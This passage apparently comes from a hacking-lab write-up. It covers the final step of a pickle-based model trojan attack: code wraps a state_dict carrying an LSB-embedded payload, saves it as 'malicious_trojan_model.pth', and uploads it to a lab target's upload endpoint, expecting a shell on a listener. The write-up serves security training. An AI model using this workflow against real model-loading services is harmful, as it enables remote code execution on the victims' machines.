# Executing The Attack

To actually execute the attack, we first need to create an instance of `TrojanModelWrapper`, and pass the entire `modified_state_dict` to its constructor, along with the `target_key` (specifying which tensor holds the payload, e.g., `"large_layer.weight"`), as well as the `NUM_LSB` used for encoding. The wrapper's `__init__` method pickles this entire `state_dict` and stores the resulting bytes internally.

We then save this `wrapper_instance` object to our final malicious file (`final_malicious_file`) using `torch.save()`. This file now contains the pickled representation of the `TrojanModelWrapper`.

```python
# Ensure the modified state dict exists from the embedding step
if "modified_state_dict" not in locals() or not isinstance(modified_state_dict, dict):
    raise NameError(
        "Critical Error: 'modified_state_dict' not found or invalid. Cannot create wrapper."
    )
# Ensure the target key used for embedding is correctly defined
if "target_key" not in locals():
    raise NameError(
        "Critical Error: 'target_key' variable not defined. Cannot create wrapper."
    )

print(f"\n--- Instantiating TrojanModelWrapper ---")
try:
    # Create an instance of our wrapper class.
    # Pass the entire modified state dictionary, the key identifying the
    # payload tensor within that dictionary, and the LSB count.
    # The wrapper's __init__ pickles the state_dict internally.
    wrapper_instance = TrojanModelWrapper(
        modified_state_dict=modified_state_dict,
        target_key=target_key,
        num_lsb=NUM_LSB,
    )
    print("TrojanModelWrapper instance created successfully.")
    print(
        "The wrapper instance now internally holds the pickled bytes of the entire modified state_dict."
    )

except Exception as e:
    print(f"\n--- Error Instantiating Wrapper ---")
    print(f"Error: {e}")
    raise SystemExit("Failed to instantiate TrojanModelWrapper.") from e

# Define the filename for our final malicious artifact
final_malicious_file = "malicious_trojan_model.pth"

print(f"\n--- Saving the Trojan Wrapper Instance to '{final_malicious_file}' ---")
try:
    torch.save(wrapper_instance, final_malicious_file)
    print(
        f"Final malicious Trojan file saved successfully to '{final_malicious_file}'."
    )
    print(f"File size: {os.path.getsize(final_malicious_file)} bytes.")

except Exception as e:
    # Catch potential errors during the final save operation
    print(f"\n--- Error Saving Final Malicious File ---")
    import traceback

    traceback.print_exc()
    print(f"Error details: {e}")
    raise SystemExit("Failed to save the final malicious wrapper file.") from e
```

send this to the target htb env

```
import requests
import os
import traceback

api_url = "http://10.129.234.139:5555/upload"  # Replace with instance details

pickle_file_path = final_malicious_file

print(f"Attempting to upload '{pickle_file_path}' to '{api_url}'...")

# Check if the malicious pickle file exists locally
if not os.path.exists(pickle_file_path):
    print(f"\nError: File not found at '{pickle_file_path}'.")
    print("Please ensure the file exists in the specified path.")
else:
    print(f"File found at '{pickle_file_path}'. Preparing upload...")
    # Prepare the file for upload in the format requests expects
    # The key 'model' must match the key expected by the Flask app (request.files['model'])
    files_to_upload = {
        "model": (
            os.path.basename(pickle_file_path),
            open(pickle_file_path, "rb"),
            "application/octet-stream",
        )
    }

    try:
        # Send the POST request with the file
        print("Sending POST request...")
        response = requests.post(api_url, files=files_to_upload)

        # Print the server's response details
        print("\n--- Server Response ---")
        print(f"Status Code: {response.status_code}")
        try:
            # Try to print JSON response if available
            print("Response JSON:")
            print(response.json())
        except requests.exceptions.JSONDecodeError:
            # Otherwise, print raw text response
            print("Response Text:")
            print(response.text)
        print("--- End Server Response ---")

        if response.status_code == 200:
            print(
                "\nUpload successful (HTTP 200). Check your listener for a connection."
            )
        else:
            print(
                f"\nUpload failed or server encountered an error (Status code: {response.status_code})."
            )

    except requests.exceptions.ConnectionError as e:
        print(f"\n--- Connection Error ---")
        print(f"Could not connect to the server at '{api_url}'.")
        print("Please ensure:")
        print("  1. The API URL is correct.")
        print("  2. Your target instance is running and the port is mapped correctly.")
        print("  3. There are no network issues (e.g., firewall).")
        print("  4. You have a listener running for the connection.")
        print(f"Error details: {e}")
        print("--- End Connection Error ---")

    except Exception as e:
        print(f"\n--- An unexpected error occurred during upload ---")
        traceback.print_exc()
        print(f"Error details: {e}")
        print("--- End Unexpected Error ---")

    finally:
        # Ensure the file handle opened for upload is closed
        if "files_to_upload" in locals() and "model" in files_to_upload:
            try:
                files_to_upload["model"][1].close()
                # print("Closed file handle for upload.")
            except Exception as e_close:
                print(f"Warning: Error closing file handle: {e_close}")

print("\nUpload script finished.")
```

![Executing the Attack](/assets/24%20Executing%20the%20Attack-20260926024721240.png)

![Executing the Attack](/assets/24%20Executing%20the%20Attack-20260926024749912.png)